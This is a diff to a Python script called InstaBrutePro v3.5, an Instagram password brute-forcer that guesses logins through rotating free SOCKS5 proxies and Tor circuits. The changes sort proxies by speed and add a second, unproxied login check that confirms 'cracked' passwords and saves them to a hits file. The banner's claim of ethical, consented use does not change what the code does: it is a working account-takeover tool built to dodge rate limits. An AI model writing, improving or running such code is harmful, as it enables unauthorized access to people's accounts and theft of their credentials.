@@ -36,7 +36,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v3.4 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v3.5 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -143,27 +143,29 @@ def generate_variations(keywords, username, mode, max_variations):
     return list(variations)[:max_variations] if max_variations != 'unlimited' else list(variations)
 
 def is_valid_proxy(proxy):
-    """Validate proxy with full CSRF fetch simulation."""
+    """Validate proxy with full CSRF fetch simulation and measure response time."""
     if not proxy.startswith('socks5://'):
-        return False
+        return False, None
     try:
         host, port = proxy.split('://')[1].split(':')
         port = int(port)
         if host == 'placeholder' or not host or port < 1 or port > 65535:
-            return False
+            return False, None
         session = requests.Session()
         session.proxies = {'http': proxy, 'https': proxy}
         retry = Retry(total=7, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
         adapter = HTTPAdapter(max_retries=retry)
         session.mount('https://', adapter)
         session.headers = {'User-Agent': UA}
+        start_time = time.time()
         resp = session.get("https://www.instagram.com/accounts/login/", timeout=20)
+        response_time = time.time() - start_time
         csrf = resp.cookies.get('csrftoken', '')
         session.close()
-        return resp.status_code == 200 and csrf
+        return (resp.status_code == 200 and csrf), response_time
     except Exception as e:
         logging.debug(f"Proxy validation failed for {proxy}: {str(e)}")
-        return False
+        return False, None
 
 def refresh_tor_circuit(port):
     """Refresh Tor circuit for a given port."""
@@ -180,13 +182,15 @@ def fetch_proxies():
     """Fetch proxies from multiple sources."""
     proxies = []
     for port in TOR_PORTS:
-        if is_valid_proxy(f"socks5://127.0.0.1:{port}"):
+        valid, _ = is_valid_proxy(f"socks5://127.0.0.1:{port}")
+        if valid:
             proxies.append(f"socks5://127.0.0.1:{port}")
     sources = [
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
         "https://www.free-proxy-list.net/anonymous-proxy.txt",
         "https://api.openproxy.space/list?type=socks5",
-        "https://spys.me/socks.txt"
+        "https://spys.me/socks.txt",
+        "https://www.proxy4free.com/en/free-socks5-proxy-list"
     ]
     for source in sources:
         try:
@@ -196,7 +200,7 @@ def fetch_proxies():
                     new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip() and ':' in line]
                 else:
                     new_proxies = [f"socks5://{p['ip']}:{p['port']}" for p in resp.json() if p.get('ip') and p.get('port')]
-                proxies.extend([p for p in new_proxies if is_valid_proxy(p) and p not in proxies])
+                proxies.extend([p for p in new_proxies if is_valid_proxy(p)[0] and p not in proxies])
             else:
                 print(f"{Colors.RED}[!] Proxy fetch failed from {source}{Colors.NC}")
         except Exception as e:
@@ -217,20 +221,24 @@ def get_proxies():
         with open('proxies/free_proxies.txt', 'r') as f:
             for line in f:
                 line = line.strip()
-                if line and is_valid_proxy(line) and line not in proxies:
+                if line and is_valid_proxy(line)[0] and line not in proxies:
                     proxies.append(line)
     except FileNotFoundError:
         print(f"{Colors.RED}[!] Proxies file missing! Fetching new proxies.{Colors.NC}")
     return proxies
 
 def sort_proxies(proxies):
-    working = []
-    print(f"{Colors.YELLOW}[*] Validating proxies against instagram.com...{Colors.NC}")
+    """Validate and sort proxies by response time."""
+    proxy_times = []
+    print(f"{Colors.YELLOW}[*] Validating and sorting proxies against instagram.com...{Colors.NC}")
     with ThreadPoolExecutor(max_workers=50) as exec:
-        working = [p for p in exec.map(lambda p: p if is_valid_proxy(p) else None, proxies) if p]
+        results = exec.map(is_valid_proxy, proxies)
+        proxy_times = [(p, rt) for p, (valid, rt) in zip(proxies, results) if valid and rt]
+    proxy_times.sort(key=lambda x: x[1])  # Sort by response time
+    working = [p for p, _ in proxy_times]
     with open('proxies/working_proxies.txt', 'w') as f:
         f.write('\n'.join(working))
-    print(f"{Colors.GREEN}[+] {len(working)} working proxies saved!{Colors.NC}")
+    print(f"{Colors.GREEN}[+] {len(working)} working proxies saved, sorted by speed!{Colors.NC}")
     return working
 
 def check_tor_ports():
@@ -252,7 +260,8 @@ def check_tor_ports():
 def get_csrf(proxies):
     for _ in range(15):
         proxy = random.choice(proxies)
-        if not is_valid_proxy(proxy):
+        valid, _ = is_valid_proxy(proxy)
+        if not valid:
             print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
             if proxy.startswith('socks5://127.0.0.1:'):
                 port = proxy.split(':')[-1]
@@ -284,6 +293,50 @@ def get_csrf(proxies):
             session.close()
     return None
 
+def verify_password(username, password):
+    """Verify a potential success with a direct, non-proxied request."""
+    session = requests.Session()
+    session.headers = {'User-Agent': UA}
+    try:
+        resp = session.get("https://www.instagram.com/accounts/login/", timeout=20)
+        csrf = resp.cookies.get('csrftoken', '')
+        if not csrf:
+            return False
+        session.headers.update({
+            'X-IG-App-ID': APP_ID,
+            'X-CSRFToken': csrf,
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+        })
+        timestamp = str(int(time.time()))
+        payload = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
+            'queryParams': '{}',
+            'optIntoOneTap': 'false'
+        }
+        signed = sign_payload(payload)
+        resp = session.post(LOGIN_URL, data=signed, timeout=20)
+        logging.debug(f"Verification attempt for {username}:{password} - Status: {resp.status_code}, Headers: {resp.headers}, Cookies: {resp.cookies.get_dict()}, Response: {resp.text}")
+        try:
+            json_resp = resp.json()
+            return (json_resp.get('authenticated') is True or
+                    json_resp.get('status') == 'ok' or
+                    'logged_in_user' in json_resp or
+                    'user_id' in json_resp or
+                    'user' in json_resp or
+                    resp.cookies.get('sessionid') or
+                    resp.status_code == 200)
+        except ValueError:
+            return resp.status_code == 200 or resp.cookies.get('sessionid')
+    except Exception as e:
+        logging.debug(f"Verification error for {password}: {str(e)}")
+        return False
+    finally:
+        session.close()
+
 def sign_payload(payload):
     body = json.dumps(payload, separators=(',', ':'))
     sig = hmac.new(SIG_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
@@ -300,7 +353,8 @@ def try_password(username, password, proxies):
         attempts_since_last_csrf_refresh = 0
     for _ in range(7):
         proxy = random.choice(proxies)
-        if not is_valid_proxy(proxy):
+        valid, _ = is_valid_proxy(proxy)
+        if not valid:
             print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
             if proxy.startswith('socks5://127.0.0.1:'):
                 port = proxy.split(':')[-1]
@@ -327,7 +381,7 @@ def try_password(username, password, proxies):
         timestamp = str(int(time.time()))
         payload = {
             'username': username,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
+             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
             'queryParams': '{}',
             'optIntoOneTap': 'false'
         }
@@ -350,16 +404,23 @@ def try_password(username, password, proxies):
                 'logged_in_user' in json_resp or
                 'user_id' in json_resp or
                 'user' in json_resp or
-                resp.cookies.get('sessionid')):
-                with lock:
-                    print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
-                    with open('hits/cracked.txt', 'a') as f:
-                        f.write(f"{username}:{password}\n")
-                    found = True
-                    return True, csrf
+                resp.cookies.get('sessionid') or
+                resp.status_code == 200):
+                print(f"{Colors.YELLOW}[*] Potential hit: {password} - Verifying...{Colors.NC}")
+                if verify_password(username, password):
+                    with lock:
+                        print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
+                        with open('hits/cracked.txt', 'a') as f:
+                            f.write(f"{username}:{password}\n")
+                        found = True
+                        return True, csrf
+                else:
+                    print(f"{Colors.RED}[!] Verification failed for {password}{Colors.NC}")
+                    current_delay = min(current_delay * 2, 2.0)
+                    continue
             elif any(x in resp.text for x in ['checkpoint_required', 'two_factor_required']):
-                print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required! Check Instagram app for {username}.{Colors.NC}")
-                logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
+                print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify required! Check Instagram app for {username}.{Colors.NC}")
+                logging.debug(f"Checkpoint for {password}: {resp.text}")
                 current_delay = min(current_delay * 2, 2.0)
                 return False, csrf
             elif any(x in resp.text for x in ['"spam":true', 'rate_limit']):
@@ -437,7 +498,6 @@ def main():
 
     # Validate user
     print(f"{Colors.YELLOW}[*] Validating username: {args.u}...{Colors.NC}")
-    import subprocess
     result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
     if "Valid" not in result.stdout:
         print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
@@ -480,7 +540,7 @@ def main():
     else:
         words = generate_variations(keywords, args.u, mode, max_variations)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
-
+   
     # Load checkpoint
     if args.r:
         checkpoint = load_checkpoint()
